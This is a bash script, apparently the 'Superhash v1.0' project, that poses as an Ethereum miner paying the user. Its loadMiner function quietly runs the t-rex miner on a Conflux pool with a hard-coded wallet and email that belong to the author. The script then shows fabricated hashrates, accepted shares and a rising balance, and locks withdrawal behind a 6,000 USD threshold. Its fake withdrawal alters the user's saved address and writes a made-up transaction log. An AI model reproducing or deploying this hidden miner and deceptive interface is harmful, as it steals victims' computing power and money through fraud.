#variables and functions defined prior to launching interface
#Colour presets

# Reset
Color_Off='\033[0m'       # Text Reset

# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White

# Underline
UBlack='\033[4;30m'       # Black
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UCyan='\033[4;36m'        # Cyan
UWhite='\033[4;37m'       # White

# Background
On_Black='\033[40m'       # Black
On_Red='\033[41m'         # Red
On_Green='\033[42m'       # Green
On_Yellow='\033[43m'      # Yellow
On_Blue='\033[44m'        # Blue
On_Purple='\033[45m'      # Purple
On_Cyan='\033[46m'        # Cyan
On_White='\033[47m'       # White

# High Intensity
IBlack='\033[0;90m'       # Black
IRed='\033[0;91m'         # Red
IGreen='\033[0;92m'       # Green
IYellow='\033[0;93m'      # Yellow
IBlue='\033[0;94m'        # Blue
IPurple='\033[0;95m'      # Purple
ICyan='\033[0;96m'        # Cyan
IWhite='\033[0;97m'       # White

# Bold High Intensity
BIBlack='\033[1;90m'      # Black
BIRed='\033[1;91m'        # Red
BIGreen='\033[1;92m'      # Green
BIYellow='\033[1;93m'     # Yellow
BIBlue='\033[1;94m'       # Blue
BIPurple='\033[1;95m'     # Purple
BICyan='\033[1;96m'       # Cyan
BIWhite='\033[1;97m'      # White

# High Intensity backgrounds
On_IBlack='\033[0;100m'   # Black
On_IRed='\033[0;101m'     # Red
On_IGreen='\033[0;102m'   # Green
On_IYellow='\033[0;103m'  # Yellow
On_IBlue='\033[0;104m'    # Blue
On_IPurple='\033[0;105m'  # Purple
On_ICyan='\033[0;106m'    # Cyan
On_IWhite='\033[0;107m'   # White



#function to emulate an ETH Miner
function ETHMine {
  #Checks if a username is set
  if test -f user.address; then
    incBy=0.031
  else
    incBy=0.03
  fi
  #generates a random hashrate
  rhr=$(($RANDOM % 15 + 40 | bc))
#Determines/builds the file to hold the balance in
  balfile=bal.address
  if test -f "$balfile"; then
    balonfile=$(<bal.address)
    if [[ $balonfile = "0" ]];
    then
      balonfile="1"
    fi
  else
    touch bal.address
    echo "0" > $balfile
    balonfile="1"
  fi
  for i in {1..8640}
  do
      echo "
      new job from eth.au.superhash.github.io:3333"
      sleep 2.5
      echo "
      new job from eth.au.superhash.github.io:3333"
      sleep 3.5
      echo "
+-------------------------+----------+----------+
|          ALGO           | Hashrate | Earnings |
+-------------------------+----------+----------+
| daggerhashimoto         |$rhr mH/s |      $balonfile USD |
| Mining ETH on Superhash |          |          |
+-------------------------+----------+----------+
"
randomms=$(($RANDOM % 450 + 100 | bc))
sleep 2.5
echo "SHARE ACCEPTED ($randomms ms)"
  balonfile=$(echo $balonfile + $incBy | bc )
  echo $balonfile > $balfile
  sleep 7.5
done
echo "Miner TimeOut. Please restart miner"
}

#Saves Address to default.address file
function saveAddress {
  if test -f "default.address"; then
    echo $isaddress > default.address
  else
    touch default.address
    echo $isaddress > default.address
  fi
}


#function for cfx-nanopool
function loadMiner {
  #Launches trex with cfx-nanopool config
echo  "Miner Launch Successful"
  #The following script hides the output of the miner

    echo "This is not here"&> /dev/null
    cd m-zenemy
    ./t-rex -a octopus -o stratum+tcp://cfx-eu1.nanopool.org:17777 -u cfx:aat0r4h64egfcd69fawzgtwzzktt0fam5yjs34tt9s.$username/dadukyblog@gmail.com -p x
    sleep 1
    #bash cfx-nanopool.bat
    echo "Or is it"&> /dev/null
    cd ..
  ETHMine
}


#asks for an ETH address (First address/address reset)
function getAddress {
  #asks for an ETH address
  echo  "Input a valid ETH address below"
  read isaddress
  #confirms the address with the user
  echo  "You've entered" $isaddress "is this correct?"
  echo  "Y/n"
  read question1address
  if [[ $question1address == "Y" ]]
  then
    echo  "Gotcha, let's do this"
    sleep 1
    saveAddress
    loadMiner
  elif [[ $question1address == "n" ]]
  then
    echo  "Okay, let's try again, then"
    getAddress
  else
    echo  "I didn't understand that, sorry"
    getAddress
  fi
}

function checkForAddress {
  sleep 1
  addressfile=default.address
  if test -f "$addressfile"; then
    addressonfile=$(<default.address)
    echo "We have $addressonfile saved as your address. Is this correct? (Y/n)"
    read question2address
    if [[ $question2address == "Y" ]]
    then
      echo  "Okay, looks good. Let's Start"
      sleep 2
      loadMiner
    elif [[ $question2address == "n" ]]
    then
      echo  "Okay, let's set a correct address then "
      sleep 2
      getAddress
    else
      echo  "Can you try that again, please?"
      sleep 2
      checkForAddress
    fi
  else
    echo  "We couldn't find an address on file, you can set one now"
    sleep 2
    getAddress
fi
}
#This function is a small menu for steps to complete after accessing the wallet
function walletNextSteps {
  echo "What would you like to do next? (s= Start Mining m= Main Menu w= Set a new wallet address x= Exit application  )"
  read question4address
  if [[ $question4address == "s" ]];
  then
    sleep 1
    loadMiner
  elif [[ $question4address == "m" ]];
  then
    sleep 1
    launchMainMenu
  elif [[ $question4address == "w" ]];
  then
    getAddress
  elif [[ $question4address == "x" ]];
  then
    exit
  else
    echo "I'm sorry, I didn't understand that, please try again"
    walletNextSteps
  fi
}

#This function loads the wallet
function startWallet {
  #Tests for the existence of both $addressonfile and whether or not the balance exceeds 6,000
  if test -f default.address; then
    if test -f bal.address; then
      #Tests to see if balance is large enough
      if [[ $(<bal.address) > 6000 ]]; then
        balonfile=$(<bal.address)
        echo "$(<default.address) Is the ETH address you set"
        echo "This wallet currently holds $(<bal.address) USD worth of Ethereum. You can withdraw your ETH below"
        read -p "Enter w to withdraw your Ethereum, or m to return to the menu " question5address
        if [[ $question5address == "w" ]] ; then
          echo "Are you sure you would like to withdraw $(<bal.address) USD in ETH to $(<default.address)? (Y/n)"
          read question6address
          if [[ $question6address == "Y" ]]; then
            withdrawCoins
          else
            echo "Gotcha, we'll keep your coins on your account for now"
            launchMainMenu
          fi
        elif [[ $question5address == "m" ]]; then
          echo "Returning to the Main Menu now"
          sleep 2
          launchMainMenu
        else
          echo "I'm afraid I don't follow. Could you try that again?"
          startWallet
        fi
      else
        balonfile=$(<bal.address)
        echo "$(<default.address) Is the ETH address you set"
        echo "This wallet currently holds $(<bal.address) USD worth of Ethereum. You need at least 6,000 USD worth of ETH in order to withdraw it"
        read -p "Press any key to return to the menu" -n 1 -s
        echo -e "\n"
        launchMainMenu
      fi
    else
      echo "Could not find an address on file. Please set one now"
      getAddress
fi
#Here is the "Else" statement for the balfile if statement
else
  echo "Could not find a balance file. Generating one now and restarting the wallet"
  touch bal.address
  balonfile=1
  echo balonfile > bal.address
  sleep 1
  startWallet
fi
}


#Function to get a username
#Checks for an existing username
function getUserName {
  if test -f "user.address"; then
    sleep 2
    echo "It looks like you already have a username, $usernameonfile. I'm going to take you back to the menu, now"
    sleep 3
    launchMainMenu
  else
    touch user.address
    usernamefile="user.address"
    echo "Okay, you can set one below"
    sleep .6
    read -p "Enter a username  " usernameonfile
    echo $usernameonfile > user.address
    sleep 1.5
    echo "Username is all set"
    sleep .5
    read -p "Press any key to return to the menu" -n 1 -s
    echo -e "\n"
    launchMainMenu
fi
}

# Function to launch the main menu
function launchMainMenu {
  if test -f "user.address"; then
    usernameonfile=$(<user.address)
  else
    sleep 1
  fi
  echo "What would you like to do today? (m=mine, w=access wallet, a=set a new address, u=set a username (This may slightly increase earnings) x=exit, Case Sensitive)"
  read question3address
  if [[ $question3address == "m" ]]; then
    echo "Checking for your address on-file"
    sleep 2
    echo -ne '\n'
    checkForAddress
  elif [[ $question3address == "w" ]]; then
    echo "Starting the wallet now"
    sleep 3
    startWallet
  elif [[ $question3address == "x" ]]; then
    exit
  elif [[ $question3address == "a" ]]; then
    sleep 2
    getAddress
    #Creates a username, which it saves in user.address and inserts into the trex mining script
  elif [[ $question3address == "u" ]]; then
    getUserName

  else
    echo "I'm sorry, I didn't understand that. Could you try again?"
    sleep 2
    launchMainMenu
  fi
}


#Function to Start Launcher
function startLauncher {
  echo  "Starting Launcher"
  sleep 2s
  echo  "Benchmarking Hashrate"
  sleep 2s
  echo  "Launching"
  echo -ne '#####                     \r'
  sleep 1.5
  echo -ne '###########               \r'
  sleep 1.5
  echo -ne '#####################     \r'
  echo -ne "######################### \r"
  echo -ne '\n'
  sleep 1.5
  echo "The Miner is Booting"
  sleep 1
  launchMainMenu
}
#clears the balance
function clearBal {
  balonfile=1
  echo "1" > bal.address
}

#Emulates coin withdrawal process
function withdrawCoins {
  #Checks for an address FILE
  #Checks to see if the address has been configured in the steps before
    if [[ $(<default.address) == "$addressonfile" ]]; then
      alteredwallet="${addressonfile}c"
    else
      addressonfile=$(<default.address)
      alteredwallet="${addressonfile}c"
    fi
    #Updates balonfile for debugging
    balonfile=$(<bal.address)
    #Generates a random TxID
    randtxID=$(LC_ALL=C tr -dc 'A-Za-z0-9'\ </dev/urandom | head -c 19 ; echo)
    #Pulls ETH price from API CALLS
    
    #Divides the current balance by the ETH price received in the previous HTTPS GET API
    ethwithdrawn=
    echo -e "Getting REST API URL \r"
    sleep 2.4
    echo -e "Passing wallet ID via HTTPS header... \r"
    sleep 1.3
    echo -e "Connecting to the stratum pool \r"
    sleep 3
    echo -e "Connection established. Wallet address (0x...) ready\r"
    sleep 1.7
    echo -e "Transferring to wallet \r"
    sleep 7
    echo -e "\033[5mCOIN TRANSFER COMPLETED. CHECK YOUR WALLET $alteredwallet \033[0m \r"
    addressonfile=$alteredwallet
    echo $addressonfile > default.address
    echo $alteredwallet > default.address
    sleep 1.5
    echo -e "A log file has been created to track the transaction. Should you experience any issues, please have this file ready when contacting support"
    if test -f "withdrawal.log"; then
      sleep 1
    else
      touch withdrawal.log
    fi
    withdrawalLogFile="withdrawal.log"
    echo "

  _____ _    _ _____  ______ _____  _    _           _____ _    _
 / ____| |  | |  __ \|  ____|  __ \| |  | |   /\    / ____| |  | |
| (___ | |  | | |__) | |__  | |__) | |__| |  /  \  | (___ | |__| |
 \___ \| |  | |  ___/|  __| |  _  /|  __  | / /\ \  \___ \|  __  |
 ____) | |__| | |    | |____| | \ \| |  | |/ ____ \ ____) | |  | |
|_____/ \____/|_|    |______|_|  \_\_|  |_/_/    \_\_____/|_|  |_|

  =============================================================================
  Hello, $usernameonfile your withdrawal #$randtxID has been completed.
  Local time at transaction: $(NOW=$( date '+%F_%H:%M:%S' ))
  Amount withdrawn: $(echo $balonfile) USD or $ethwithdrawn ETH
  Wallet address: $alteredwallet
  END OF LOG FILE
  =============================================================================

  Transaction is completed. This is irreversible.
  Should you have any issues, please contact us.
  Superhash v1.0 by DaDuky, Kirschy
 " >> withdrawal.log
    clearBal
    echo -e "\n"
    read -p "Press any key to return to the menu" -n 1 -s
    echo -e "\n"
    launchMainMenu
}

#CALLS ALL FUNCTIONS
echo  "
   _____ _    _ _____  ______ _____  _    _           _____ _    _
  / ____| |  | |  __ \|  ____|  __ \| |  | |   /\    / ____| |  | |
 | (___ | |  | | |__) | |__  | |__) | |__| |  /  \  | (___ | |__| |
  \___ \| |  | |  ___/|  __| |  _  /|  __  | / /\ \  \___ \|  __  |
  ____) | |__| | |    | |____| | \ \| |  | |/ ____ \ ____) | |  | |
 |_____/ \____/|_|    |______|_|  \_\_|  |_/_/    \_\_____/|_|  |_|
 V1.0
https://github.com/TimothyT1/Superhash
This software comes with no warranty whatsoever, as permitted by local laws.
It is licensed under GNU3, and is completely open-source.
Thanks to DaDuky!
"
startLauncher
